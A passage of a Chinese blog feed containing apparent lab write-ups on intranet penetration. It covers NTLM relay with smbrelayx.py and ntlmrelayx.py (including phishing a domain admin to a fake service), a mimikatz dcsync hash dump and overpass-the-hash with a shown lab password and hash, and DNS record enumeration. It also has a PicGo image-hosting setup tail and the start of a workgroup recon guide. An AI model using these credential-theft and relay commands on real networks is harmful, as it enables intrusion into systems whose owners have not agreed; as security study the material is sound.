<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194136342.png" alt="image-20211203194136342" /></p>
<p>同样是在个人设置里，选择私人令牌</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194302300.png" alt="image-20211203194302300" /></p>
<p>点击 &quot;生成新令牌&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194323747.png" alt="image-20211203194323747" /></p>
<p>勾选相关权限如下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194336263.png" alt="image-20211203194336263" /></p>
<p>最后生成令牌，同样需要马上复制保存，因为之后就不会再出现这个 <code>token</code>  了。</p>
<h2 id="picgo配置码云"><a class="anchor" href="#picgo配置码云">#</a> PicGo 配置码云</h2>
<p>点击 &quot;图床配置&quot; 里面的 <code>gitee</code>  选项，就可以看到相关配置信息</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194410728.png" alt="image-20211203194410728" /></p>
<p><code>repo</code> :  <code>gitee</code>  用户名 / 仓库名</p>
<p><code>branch</code> : 分支名</p>
<p><code>token</code> : 码云的 <code>token</code> ，复制上一步的 <code>token</code></p>
<p><code>path</code> : 图片在仓库的保存路径，可以根据自己的情况填写</p>
<h2 id="typora配置picgo"><a class="anchor" href="#typora配置picgo">#</a> Typora 配置 PicGo</h2>
<p>接下来在 <code>Typora</code>  里配置我们的 <code>PicGo</code>  服务就大功告成了！</p>
<p>打开 <code>Typora</code>  偏好设置，进入图像页面，配置 <code>picgo</code>  相关项即可</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194459129.png" alt="image-20211203194459129" /></p>
<p>可点击 “图片验证”，进行上传测试如下：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211203194523866.png" alt="image-20211203194523866" /></p>
]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透学习之 Net-NTLM Relay Attack</title>
    <url>/article/aea05eaa.html</url>
    <content><![CDATA[<h2 id="net-ntlm-relay-attack漏洞原理"><a class="anchor" href="#net-ntlm-relay-attack漏洞原理">#</a> Net-NTLM Relay Attack 漏洞原理</h2>
<p><code>Net-NTLM Relay</code>  原理，它是发生在  <code>NTLM</code>  认证的第三步，客户端发送使用服务端  <code>NTLM Hash</code>  加密的  <code>Challenge</code>  值，得到  <code>Net-NTLMHash</code> 。我们就是要重放这个  <code>Net-NTLMHash</code>  来进行攻击。</p>
<p>所以，进行 <code>NTLM Relay</code>  攻击的第一步我们首先要获得这个 <code>Net-NTLMHash</code>  值。那么如何能获得这个 <code>Net-NTLMHash</code>  值呢？思路是让受害者把  <code>Net-NTLMhash</code>  自己发送给攻击者，也就是说只要是使用  <code>SMB</code> 、 <code>HTTP</code> 、 <code>LDAP</code> 、 <code>MSSQL</code>  等协议来进行  <code>NTLM</code>  认证的程序，都可以尝试用来向攻击者发送  <code>Net-NTLM hash</code> 。</p>
<p>在内网渗透中若利用  <code>LLMNR/NetBIOS</code>  成功劫持并获得了目标主机的  <code>Net-NTLM Hash</code> ，如果我们有一个强大的字典也可以进行爆破。</p>
<p><code>Net-NTLM Hash</code>  不像  <code>NTLM-Hash</code> ，我们不能用  <code>Net-NTLM Hash</code>  来进行  <code>Pass The Hash</code> 。所以我们可以试着通过 <code>NTLM Relay Attack</code>  来实现。</p>
<h2 id="通过-smb-来进行-relay-attack"><a class="anchor" href="#通过-smb-来进行-relay-attack">#</a> 通过 SMB 来进行 Relay Attack</h2>
<p><code>SMB</code>  协议的  <code>Relay</code>  攻击，可直接  <code>Relay</code>  到  <code>smb</code>  服务器，是最直接最有效的方法。</p>
<p>通过  <code>SMB Relay Attack</code>  我们可以在目标远程服务器上执行命令，上传我们的恶意  <code>exe</code>  ，又或者到远程服务上执行恶意代码 ... 等等</p>
<h3 id="relay-attack-的两种场景"><a class="anchor" href="#relay-attack-的两种场景">#</a> Relay Attack 的两种场景：</h3>
<h4 id="1工作组环境"><a class="anchor" href="#1工作组环境">#</a> 1：工作组环境</h4>
<p>在工作组环境里面，工作组中的机器之间相互没有信任关系，每台机器的账号密码  <code>Hash</code>  只是保存在自己的  <code>SAM</code>  文件中，这个时候  <code>Relay</code>  到别的机器可能性就不大，除非两台机器的账号密码一样，不然毫无意义。</p>
<h4 id="2域环境"><a class="anchor" href="#2域环境">#</a> 2：域环境</h4>
<p>我们知道在域环境下所有域用户的账号密码  <code>Hash</code>  都保存在域控的  <code>ntds.dit</code>  里面。若没有限制域用户登录到某台机子，那就可以将该域用户  <code>Relay</code>  到别人的机子，或者是拿到域控的请求，将域控  <code>Relay</code>  到普通的机子，比如域管运维所在的机器。</p>
<p><strong>PS</strong>：域环境下域控默认开启  <code>smb</code>  签名</p>
<h2 id="当前环境"><a class="anchor" href="#当前环境">#</a> 当前环境</h2>
<table>
<thead>
<tr>
<th>目标</th>
<th>机器</th>
<th>IP</th>
<th>子网掩码</th>
</tr>
</thead>
<tbody>
<tr>
<td>攻击人员 21r000</td>
<td>Kali Linux</td>
<td>10.211.55.15</td>
<td>255.0.0.0</td>
</tr>
<tr>
<td>域控制器</td>
<td>Windows 20012server</td>
<td>10.211.55.12</td>
<td>255.0.0.0</td>
</tr>
<tr>
<td>域内机器</td>
<td>Win 7</td>
<td>10.211.55.7</td>
<td>255.0.0.0</td>
</tr>
</tbody>
</table>
<h2 id="kali-加入域"><a class="anchor" href="#kali-加入域">#</a> Kali 加入域</h2>
<p>配置如下:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2012</span> <span class="token constant">R2</span> x64</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token literal-property property">计算机名</span><span class="token operator">:</span> Server2012</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token literal-property property">计算机全名</span><span class="token operator">:</span> Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token literal-property property">域</span><span class="token operator">:</span> 21r000<span class="token punctuation">.</span>org</pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token literal-property property">域控管理员</span><span class="token operator">:</span> administrator</pre></td></tr><tr><td data-num="6"></td><td><pre>普通用户：21r000</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207175302148.png" alt="image-20211207175302148" /></p>
<p>安装软件:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo apt install aptitude</pre></td></tr><tr><td data-num="2"></td><td><pre>sudo aptitude install sssd realmd <span class="token operator">-</span>y</pre></td></tr><tr><td data-num="3"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install adcli realmd krb5<span class="token operator">-</span>user samba<span class="token operator">-</span>common<span class="token operator">-</span>bin samba<span class="token operator">-</span>libs samba<span class="token operator">-</span>dsdb<span class="token operator">-</span>modules sssd sssd<span class="token operator">-</span>tools libnss<span class="token operator">-</span>sss libpam<span class="token operator">-</span>sss packagekit policykit<span class="token operator">-</span><span class="token number">1</span> </pre></td></tr><tr><td data-num="4"></td><td><pre>sudo apt<span class="token operator">-</span><span class="token keyword">get</span> install samba # 如果需要samba共享目录给Windows。需要安装这个</pre></td></tr></table></figure><p>编辑 <code>/etc/resolve.conf</code>  文件，将 <code>DNS</code>  指向 <code>Server2012</code></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>sudo vim <span class="token operator">/</span>etc<span class="token operator">/</span>resolv<span class="token punctuation">.</span>conf</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207180356222.png" alt="image-20211207180356222" /></p>
<p>编辑 <code>/etc/hosts</code>  文件，添加 <code>Server2012</code>  的 <code>IP</code>  及域的对应关系</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207183014658.png" alt="image-20211207183014658" /></p>
<p>编辑 <code>IP</code>  地址</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>vi <span class="token operator">/</span>etc<span class="token operator">/</span>network<span class="token operator">/</span>interfaces</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207181420632.png" alt="image-20211207181420632" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>inface eth0 inet <span class="token keyword">static</span>    #设置 eth0 使用默认的静态地址</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>address <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.15</span>   #设置 eth0 的ip 地址</pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>gatework <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.1</span>    #配置当前主机的默认网关</pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre>netmask  <span class="token number">255.0</span><span class="token number">.0</span><span class="token number">.0</span>   #设置 eth0 的子网掩码</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207183602996.png" alt="image-20211207183602996" /></p>
<p>重新配置网卡信息</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>dhclient</pre></td></tr></table></figure><p>将 <code>Linux</code>  机器加入域</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>realm join Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">-</span><span class="token constant">U</span> administrator</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token operator">--</span> Server2012<span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org 为 <span class="token constant">DC</span> 主机名</pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token operator">--</span> administrator 为域管理员账号</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207185640793.png" alt="image-20211207185640793" /></p>
<p>查看是否成功加入</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>realm list</pre></td></tr></table></figure><h2 id="通过-smbrelayxpy-进行-relay-attack"><a class="anchor" href="#通过-smbrelayxpy-进行-relay-attack">#</a> 通过 <span class="exturl" data-url="aHR0cDovL3NtYnJlbGF5eC5weQ==">smbrelayx.py</span> 进行 Relay Attack</h2>
<p>1、在攻击人员 <code>21r000</code>  上执行如下命令监听  <code>80</code>  和  <code>445</code>  端口，伪造  <code>http</code>  和  <code>smb</code>  服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>#SMBRelay 攻击 <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> 主机，并执行 whoami 命令</pre></td></tr><tr><td data-num="2"></td><td><pre>python3 smbrelayx<span class="token punctuation">.</span>py <span class="token operator">-</span>h <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> <span class="token operator">-</span>c whoami</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207191230754.png" alt="image-20211207191230754" /></p>
<p>2、通过钓鱼或者其他手段诱导域管理员或域用户访问了攻击人员 <code>21r000</code>  伪造的  <code>HTTP</code>  或  <code>SMB</code>  服务，访问 <span class="exturl" data-url="aHR0cDovLzEwLjIxMS41NS4xNQ==">http://10.211.55.15</span> ，并输入账号密码进行认证：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207191427263.png" alt="image-20211207191427263" /></p>
<p>3、此时就  <code>Relay</code>  成功获取到  <code>10.211.55.7</code>  的  <code>system</code>  权限（当然只是  <code>whoami</code>  命令，实战中可以直接远程加载  <code>powershell</code>  或者其他手段反弹  <code>Shell</code>  到  <code>C2</code> ）</p>
<h2 id="通过-ntlmrelayxpy-进行-relay-attack"><a class="anchor" href="#通过-ntlmrelayxpy-进行-relay-attack">#</a> 通过 <span class="exturl" data-url="aHR0cDovL250bG1yZWxheXgucHk=">ntlmrelayx.py</span> 进行 Relay Attack</h2>
<p>1、在攻击人员 <code>21r000 </code>  上执行如下命令监听  <code>80</code>  和  <code>445</code>  端口，伪造  <code>http</code>  和  <code>smb</code>  服务：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre># SMBRelay 攻击 <span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> 主机，并执行 whoami 命令</pre></td></tr><tr><td data-num="2"></td><td><pre>python3 ntlmrelayx<span class="token punctuation">.</span>py <span class="token operator">-</span>t smb<span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.211</span><span class="token number">.55</span><span class="token number">.7</span> <span class="token operator">-</span>c whoami <span class="token operator">-</span>smb2support</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207192015624.png" alt="image-20211207192015624" /></p>
<p>2、通过钓鱼或者其他手段诱导域管理员或域用户访问了攻击人员 <code>21r000</code>  伪造的  <code>HTTP</code>  或  <code>SMB</code>  服务，访问 <span class="exturl" data-url="aHR0cDovLzEwLjIxMS41NS4xNQ==">http://10.211.55.15</span>，并输入账号密码进行认证：</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207191427263.png" alt="image-20211207191427263" /></p>
<p>或者让域控随便访问一个资源使用  <code>smb</code>  触发：（因为它会检查本地  <code>host</code>  文件，然后检查  <code>DNS</code> ，如果都不存在，就会通过  <code>LLMNR</code>  协议进行多播，在局域网中进行搜索。此时可以在攻击机上看到  <code>Responder</code>  的响应，然后受害者的  <code>Windows</code>  机器会向攻击者进行身份验证）</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207192149736.png" alt="image-20211207192149736" /></p>
<p>3、此时就  <code>Relay</code>  成功获取到  <code>10.211.55.7</code>  的  <code>system</code>  权限：</p>
<h2 id="感言"><a class="anchor" href="#感言">#</a> 感言</h2>
<p>这里贴上项目地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzIxcjAwMC9pbXBhY2tldA==">https://github.com/21r000/impacket</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211207192947911.png" alt="image-20211207192947911" /></p>
<h3 id="参考链接"><a class="anchor" href="#参考链接">#</a> 参考链接：</h3>
<p><span class="exturl" data-url="QXR0YWNraHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3Mvb3NuSUR1OW9nTVRlZEV6ZkdLUlR3UQ==">内网渗透中的 Net-NTLM Relay</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>域渗透——DNS记录的获取</title>
    <url>/article/9ce09b1b.html</url>
    <content><![CDATA[<h2 id="00x00-前言"><a class="anchor" href="#00x00-前言">#</a> 00x00 前言</h2>
<p>早上一觉起来码子变红了是什么体验，crazy！！！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210152111868.png" alt="image-20211210152111868" /></p>
<h2 id="00x01-简介"><a class="anchor" href="#00x01-简介">#</a> 00x01 简介</h2>
<p>本文将要介绍以下内容：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>通过<span class="token constant">DNS</span> Manager获取<span class="token constant">DNS</span>记录</pre></td></tr><tr><td data-num="2"></td><td><pre>通过dnscmd获取<span class="token constant">DNS</span>记录</pre></td></tr><tr><td data-num="3"></td><td><pre>域内远程读取<span class="token constant">DNS</span>记录的方法</pre></td></tr></table></figure><h2 id="00x02-通过dns-manager获取dns记录"><a class="anchor" href="#00x02-通过dns-manager获取dns记录">#</a> 00x02 通过 DNS Manager 获取 DNS 记录</h2>
<p>测试系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2012</span> <span class="token constant">R2</span> x64</pre></td></tr></table></figure><p>选择‘工具’ -&gt;  <code>DNS</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210153159220.png" alt="image-20211210153159220" /></p>
<p>在‘正向查找区域’下找到当前域名，能够显示当前域内的 <code>DNS</code>  记录，包括主机名和对应的 <code>IP</code> 。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210153404620.png" alt="image-20211210153404620" /></p>
<h2 id="00x03-通过dnscmd获取dns记录"><a class="anchor" href="#00x03-通过dnscmd获取dns记录">#</a> 00x03 通过 dnscmd 获取 DNS 记录</h2>
<h3 id="dnscmd"><a class="anchor" href="#dnscmd">#</a> dnscmd</h3>
<p>用来管理 <code>DNS</code>  服务器的命令行接口，支持远程连接。</p>
<p>默认安装的系统：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Windows Server <span class="token number">2003</span></pre></td></tr><tr><td data-num="2"></td><td><pre>Windows Server <span class="token number">2008</span></pre></td></tr><tr><td data-num="3"></td><td><pre>Windows Server <span class="token number">2003</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="4"></td><td><pre>Windows Server <span class="token number">2008</span> <span class="token constant">R2</span></pre></td></tr><tr><td data-num="5"></td><td><pre>Windows Server <span class="token number">2012</span></pre></td></tr><tr><td data-num="6"></td><td><pre>Windows Server <span class="token number">2003</span> <span class="token keyword">with</span> <span class="token constant">SP1</span></pre></td></tr><tr><td data-num="7"></td><td><pre>…</pre></td></tr></table></figure><p>常用命令:</p>
<p>(1) 列出 DNS 区域中当前节点的资源记录：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210153733524.png" alt="image-20211210153733524" /></p>
<p>(2) 列出 http://21r000.org 的信息：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>ZoneInfo 21r000<span class="token punctuation">.</span>org</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210153837641.png" alt="image-20211210153837641" /></p>
<p>(3) 列举 http://21r000.org 中的记录，方法 1 (更详细)：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>ZonePrint 21r000<span class="token punctuation">.</span>org</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210154011017.png" alt="image-20211210154011017" /></p>
<p>(4) 列举 http://21r000.org 的记录，方法 2：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token punctuation">.</span> <span class="token operator">/</span>EnumRecords 21r000<span class="token punctuation">.</span>org <span class="token punctuation">.</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211210154108829.png" alt="image-20211210154108829" /></p>
<p>结果同 <code>DNS Manager</code>  获取的记录一致。</p>
<h2 id="00x04-域内远程读取dns记录的方法"><a class="anchor" href="#00x04-域内远程读取dns记录的方法">#</a> 00x04 域内远程读取 DNS 记录的方法</h2>
<h3 id="方法分析"><a class="anchor" href="#方法分析">#</a> 方法分析</h3>
<p>前提需要获得域管理员的权限。</p>
<p>第一种方法是先远程连接域控制器，然后在域控制器上执行 <code>dnscmd</code>  获取 <code>DNS</code>  记录。</p>
<p>第二种方法是在域内一台主机上面，执行 <code>dnscmd</code>  远程读取 <code>DNS</code>  记录。</p>
<p>在未安装 <code>Remote Server Administration Tools (RSAT)</code>  的系统上执行 <code>dnscmd</code> ，需要满足以下条件：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>dnscmd保存在路径<span class="token constant">C</span><span class="token operator">:</span>WindowsSystem32下</pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre>dnscmd<span class="token punctuation">.</span>exe<span class="token punctuation">.</span>mui保存在<span class="token constant">C</span><span class="token operator">:</span>WindowsSystem32en<span class="token operator">-</span><span class="token constant">US</span><span class="token function">下</span><span class="token punctuation">(</span>该位置比较通用，也可以在其他位置<span class="token punctuation">)</span></pre></td></tr></table></figure><p>注： <code>dnscmd</code>  和 <code>dnscmd.exe.mui</code>  使用该<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tLzNnc3R1ZGVudC90ZXN0Lw==">项目</span>中的即可。</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9zdXBwb3J0Lm1pY3Jvc29mdC5jb20vZW4tdXMvaGVscC8yNjkzNjQzL3JlbW90ZS1zZXJ2ZXItYWRtaW5pc3RyYXRpb24tdG9vbHMtcnNhdC1mb3Itd2luZG93cy1vcGVyYXRpbmctc3lzdGVtcw==">Win7 系统安装 Remote Server Administration Tools (RSAT) 教程</span></p>
<p>由于 <code>dnscmd</code>  在远程连接时，未提供输入用户名和口令的接口，这里需要借助 <code>mimikatz</code>  的 <code>Overpass-the-hash</code> 。</p>
<p>首先需要获得域管理员用户的 <code>hash</code> ，这里只能用 <code>ntlm/rc4/aes128/aes256</code></p>
<p>如果获得了域管理员用户的明文口令，可以先将明文转为 <code>ntlm</code> ，<span class="exturl" data-url="aHR0cHM6Ly9tZDVkZWNyeXB0Lm5ldC9lbi9OdGxtLw==">在线加解密的网站</span></p>
<p>域控制器上执行 <code>mimikatz</code> ，使用 <code>dcsync</code>  获得域内所有用户 <code>hash</code> ：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"lsadump::dcsync /domain:21r000.org /all /csv exit"</span></pre></td></tr></table></figure><p>测试环境的参数如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>域管理员用户：Administrator</pre></td></tr><tr><td data-num="2"></td><td><pre>口令：DomainAdmin456<span class="token operator">!</span></pre></td></tr><tr><td data-num="3"></td><td><pre>hash：<span class="token constant">A55E0720F0041193632A58E007624B40</span></pre></td></tr></table></figure><p>Overpass-the-hash:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"sekurlsa::pth /user:Administrator /domain:21r000.org /ntlm:A55E0720F0041193632A58E007624B40"</span></pre></td></tr></table></figure><p>这样会弹出一个 <code>cmd.exe</code></p>
<p>接着使用 <code>dnscmd</code>  远程连接进行查询：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span><span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p>或者直接用计算机名称:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span> <span class="token operator">/</span>EnumZones</pre></td></tr></table></figure><p>注：这里要使用 <code>FQDN</code>  或者计算机名。</p>
<p>如果想在命令行下实现整个流程，可以采用如下方法：</p>
<p>新建 <code>c:test1.bat</code> ，内容如下：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>Dnscmd <span class="token constant">WIN</span><span class="token operator">-</span><span class="token constant">F08C969D7FM</span><span class="token punctuation">.</span>21r000<span class="token punctuation">.</span>org <span class="token operator">/</span>EnumZones <span class="token operator">></span> c<span class="token operator">:</span>testout<span class="token punctuation">.</span>txt</pre></td></tr></table></figure><p>Overpass-the-hash:</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>mimikatz<span class="token punctuation">.</span>exe privilege<span class="token operator">:</span><span class="token operator">:</span>debug <span class="token string">"sekurlsa::pth /user:Administrator /domain:21r000.org /ntlm:A55E0720F0041193632A58E007624B40 /run:"</span>cmd<span class="token punctuation">.</span>exe <span class="token operator">/</span>c c<span class="token operator">:</span>test1<span class="token punctuation">.</span>bat<span class="token string">""</span></pre></td></tr></table></figure><p>注： <code>cmd.exe</code>  下 &quot;需要使用转义字符&quot;</p>
<p>参考链接：</p>
<p><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl8zOTY3OTM3MC9hcnRpY2xlL2RldGFpbHMvMTEwMzAzNDAy">bat 域 本机管理员密码_域渗透 ——DNS 记录的获取</span></p>
]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>工作组环境中进行内网渗透常见方法总结</title>
    <url>/article/33894e1d.html</url>
    <content><![CDATA[<p>呜呜呜，被佬批评了，这应该是上篇就要了解的板块了，忘记啦 QAQ！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126173914204.png" alt="image-20211126173914204" /></p>
<p>emmmm，先了解一下域环境和工作组环境的区别吧。其实之前就有写过（小声 bb：忘记了）。</p>
<h2 id="域和工作组的区别"><a class="anchor" href="#域和工作组的区别">#</a> 域和工作组的区别</h2>
<p>1、域英文叫 <code>DOMAIN</code> —— 域 ( <code>Domain</code> ) 是 <code>Windows</code>  网络中独立运行的单位，域之间相互访问则需要建立信任关系 (即 <code>Trust Relation</code> )。信任关系是连接在域与域之间的桥梁。当一个域与其他域建立了信任关系后，2 个域之间不但可以按需要相互进行管理，还可以跨网分配文件和打印机等设备资源，使不同的域之间实现网络资源的共享与管理。</p>
<p>2、工作组（ <code>Work Group</code> ）是局域网中的一个概念。它是最常见最简单最普通的资源管理模式，就是将不同的电脑按功能分别列入不同的组中，以方便管理。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126173606304.png" alt="image-20211126173606304" /></p>
<p>1、域和工作组适用的环境不同，域一般是用在比较大的网络里，工作组则较小，在一个域中需要一台类似服务器的计算机，叫域控服务器，其他电脑如果想互相访问首先都是经过它的，但是工作组则不同，在一个工作组里的所有计算机都是对等的，也就是没有服务器和客户机之分的，但是和域一样，如果一台计算机想访问其他计算机的话首先也要找到这个组中的一台类似组控服务器，组控服务器不是固定的，以选举的方式实现，它存储着这个组的相关信息，找到这台计算机后得到组的信息然后访问。</p>
<p>2、工作组是一群计算机的集合，它仅仅是一个逻辑的集合，各自计算机还是各自管理的，你要访问其中的计算机，还是要到被访问计算机上来实现用户验证的。而域不同，域是一个有安全边界的计算机集合，在同一个域中的计算机彼此之间已经建立了信任关系，在域内访问其他机器，不再需要被访问机器的许可了。</p>
<h2 id="0x01-netbios"><a class="anchor" href="#0x01-netbios">#</a> <strong>0x01 NetBIOS</strong></h2>
<p>网络基本输入 / 输出系统 ( <code>Network Basic Input/Output System, NetBIOS</code> ) 是一种标准的应用程序编程接口， <code>NetBIOS</code>  名称解析就是 <code>NetBIOS名称映射到IP地址的过程</code> 。</p>
<p><strong>nbtstat</strong></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126174750789.png" alt="image-20211126174750789" /></p>
<p>查看本机 IP</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126175333998.png" alt="image-20211126175333998" /></p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre>nbtstat <span class="token operator">-</span><span class="token constant">A</span> 本机<span class="token constant">IP</span></pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126175359376.png" alt="image-20211126175359376" /></p>
<p><strong>nbtscan</strong></p>
<p>附上系统城的下载链接：</p>
<figure class="highlight javascript"><figcaption data-lang="javascript"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token literal-property property">windows版本：http</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>xitongzhijia<span class="token punctuation">.</span>net<span class="token operator">/</span>soft<span class="token operator">/</span><span class="token number">195386</span><span class="token punctuation">.</span>html</pre></td></tr></table></figure><p><code>Windows</code>  版本</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126175903687.png" alt="image-20211126175903687" /></p>
<p><code>Linux</code>  版本</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20211126180059119.png" alt="image-20211126180059119" /></p>
<h2 id="0x02-nt-lan-manager"><a class="anchor" href="#0x02-nt-lan-manager">#</a> <strong>0x02 NT Lan Manager</strong></h2>
